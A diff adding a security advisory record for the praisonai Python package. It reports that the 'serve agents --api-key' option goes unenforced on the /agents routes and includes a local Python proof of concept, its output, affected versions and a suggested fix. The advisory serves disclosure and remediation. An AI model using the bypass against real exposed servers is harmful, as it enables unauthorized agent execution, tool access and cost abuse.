@@ -1,0 +1,78 @@
+{
+  "id": "GHSA-7ww9-85pg-cv4x",
+  "modified": "2026-08-25T23:49:24.801456621Z",
+  "published": "2026-08-25T14:42:25Z",
+  "aliases": [
+    "CVE-2026-55534"
+  ],
+  "summary": "PraisonAI serve agents --api-key is ignored, allowing unauthenticated remote agent execution",
+  "details": "### Summary\n\n  PraisonAI's `praisonai serve agents` command exposes `--api-key` as the documented\n  authentication control for production/external deployments, but the configured key is not\n  enforced on the public agent invocation compatibility endpoints.\n\n  An operator can start the server with `--api-key` and bind it to `0.0.0.0`, but any network-\n  reachable caller can still invoke agents through `POST /agents` or `POST /agents/\n  {agent_name}` without `Authorization`, `X-API-Key`, a query token, or any other credential.\n\n  Confirmed vulnerable:\n  - v4.6.48 / commit `d5f1114aaf1a2e9f121a6e66b929149ca2201f1d`\n  - v4.6.34 / commit `e5928449f73f66cc8af1de61621aa974ab255133`\n\n  Likely affected range: `\u003e= 4.6.34, \u003c= 4.6.48`.\n\n  This is distinct from CVE-2026-44338 / GHSA-6rmh-7xcm-cpxj, which covered the legacy Flask\n  `api_server.py` path before 4.6.34. This report concerns the newer FastAPI `serve agents\n  --api-key` code path and is confirmed in v4.6.48.\n\n  ### Details\n\n  The CLI accepts and forwards an API key:\n\n  - `src/praisonai/praisonai/cli/commands/serve.py:156` defines `praisonai serve agents`\n  - `src/praisonai/praisonai/cli/commands/serve.py:162` exposes `--api-key`\n  - `src/praisonai/praisonai/cli/commands/serve.py:175-176` forwards the supplied key\n  - `src/praisonai/praisonai/cli/features/serve.py:191` handles the `agents` subcommand\n  - `src/praisonai/praisonai/cli/features/serve.py:199` parses `api_key` into the config\n\n  However, `_create_agents_app()` never uses `config[\"api_key\"]` to create middleware or a\n  FastAPI auth dependency:\n\n  - `src/praisonai/praisonai/cli/features/serve.py:228` creates the FastAPI app\n  - `src/praisonai/praisonai/cli/features/serve.py:287` registers `POST {path}` with no auth\n  dependency\n  - `src/praisonai/praisonai/cli/features/serve.py:346` registers `POST /agents/{agent_name}`\n  with no auth dependency\n  - `src/praisonai/praisonai/cli/features/serve.py:356-370` executes the registered agent\n  directly\n\n  The same app also mounts `praisonai.api.agent_invoke`, whose `/api/v1/agents/{agent_id}/\n  invoke` route is protected separately by `CALL_SERVER_TOKEN`. That means the protected `/\n  api/v1` route and the unauthenticated `/agents` compatibility routes coexist in the same\n  server. Setting `--api-key` does not protect the compatibility routes.\n\n  ### PoC\n\n  This local-only PoC does not open a network listener and does not call an LLM provider. It\n  constructs the FastAPI app through the real `ServeHandler._create_agents_app()` path with\n  `api_key` set, registers a fake agent, and sends an unauthenticated request using FastAPI\n  `TestClient`.\n\n  ```python\n  #!/usr/bin/env python3\n  from __future__ import annotations\n\n  import sys\n  import tempfile\n  from pathlib import Path\n\n  REPO = Path(\"/path/to/PraisonAI\")\n  sys.path[:0] = [\n      str(REPO / \"src\" / \"praisonai\"),\n      str(REPO / \"src\" / \"praisonai-agents\"),\n  ]\n\n  class FakeAgent:\n      def __init__(self):\n          self.calls = []\n\n      def start(self, query):\n          self.calls.append(query)\n          return f\"fake-agent-ran:{query}\"\n\n  def main() -\u003e None:\n      from fastapi.testclient import TestClient\n      from praisonai.cli.features.serve import ServeHandler\n      from praisonai.api import agent_invoke\n\n      with tempfile.TemporaryDirectory() as tmp:\n          agents_yaml = Path(tmp) / \"agents.yaml\"\n          agents_yaml.write_text(\n              \"roles:\\n\"\n              \"  placeholder:\\n\"\n              \"    role: Placeholder\\n\"\n              \"    goal: Placeholder\\n\"\n              \"    backstory: Placeholder\\n\",\n              encoding=\"utf-8\",\n          )\n\n          handler = ServeHandler()\n          app = handler._create_agents_app(\n              {\n                  \"file\": str(agents_yaml),\n                  \"host\": \"0.0.0.0\",\n                  \"port\": 8000,\n                  \"path\": \"/agents\",\n                  \"reload\": False,\n                  \"api_key\": \"operator-secret-api-key\",\n              }\n          )\n\n          fake_agent = FakeAgent()\n          agent_invoke.register_agent(\"poc\", fake_agent)\n\n          client = TestClient(app)\n          response = client.post(\n              \"/agents/poc\",\n              json={\"query\": \"unauthenticated request\"},\n          )\n\n          print(f\"STATUS_CODE={response.status_code}\")\n          print(f\"RESPONSE_JSON={response.json()!r}\")\n          print(f\"AGENT_CALLS={fake_agent.calls!r}\")\n          print(f\"UNAUTHENTICATED_AGENT_EXECUTED={fake_agent.calls == ['unauthenticated\n          request']}\")\n\n  if __name__ == \"__main__\":\n      main()\n\n  Run:\n\n  cd /path/to/PraisonAI\n  python3 praisonai-serve-agents-api-key-bypass.py\n\n  Observed output:\n\n  STATUS_CODE=200\n  RESPONSE_JSON={'response': 'fake-agent-ran:unauthenticated request'}\n  AGENT_CALLS=['unauthenticated request']\n  UNAUTHENTICATED_AGENT_EXECUTED=True\n\n  The important condition is that the app was configured with:\n\n  \"api_key\": \"operator-secret-api-key\"\n\n  but the request was sent without any auth header:\n\n  client.post(\"/agents/poc\", json={\"query\": \"unauthenticated request\"})\n\n  The agent still executed and returned HTTP 200.\n\n  ### Impact\n\n  Any attacker who can reach a praisonai serve agents server can invoke configured agents even\n  when the operator explicitly configured --api-key.\n\n  Impact depends on the configured agents and their tools, but can include:\n\n  - unauthorized LLM/API usage and provider cost consumption;\n  - execution of agent workflows;\n  - access to connected tool integrations;\n  - reads/writes through file, database, cloud, browser, MCP, or messaging tools;\n  - availability impact from repeated or long-running agent invocations.\n\n  This is especially risky because the documented production pattern recommends using --api-\n  key when binding the server publicly.\n\n  ### Suggested fix\n\n  Fail closed when --api-key is configured and require it on every agent invocation route in\n  the serve agents app.\n\n  Recommended changes:\n\n  - In _create_agents_app(), derive an auth dependency from config.get(\"api_key\").\n  - Apply it to both POST {path} and POST /agents/{agent_name}.\n  - Prefer Authorization: Bearer \u003capi_key\u003e. Optionally also support X-API-Key for\n    compatibility.\n\n  - Use constant-time comparison for the expected key.\n  - Clarify or unify the relationship between --api-key and CALL_SERVER_TOKEN.\n  - Add tests proving:\n      - key configured + no header returns 401/403;\n      - key configured + wrong header returns 401/403;\n      - key configured + correct header executes;\n      - both /agents and /agents/{agent_name} are covered.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "praisonai",
+        "purl": "pkg:pypi/praisonai"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.6.34"
+            },
+            {
+              "fixed": "4.6.58"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.6.34",
+        "4.6.35",
+        "4.6.36",
+        "4.6.37",
+        "4.6.38",
+        "4.6.39",
+        "4.6.40",
+        "4.6.41",
+        "4.6.42",
+        "4.6.43",
+        "4.6.44",
+        "4.6.45",
+        "4.6.46",
+        "4.6.47",
+        "4.6.48",
+        "4.6.50",
+        "4.6.51",
+        "4.6.52",
+        "4.6.53",
+        "4.6.54",
+        "4.6.55",
+        "4.6.56",
+        "4.6.57"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-7ww9-85pg-cv4x/GHSA-7ww9-85pg-cv4x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-7ww9-85pg-cv4x"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MervinPraison/PraisonAI"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58"
+    }
+  ]
+}
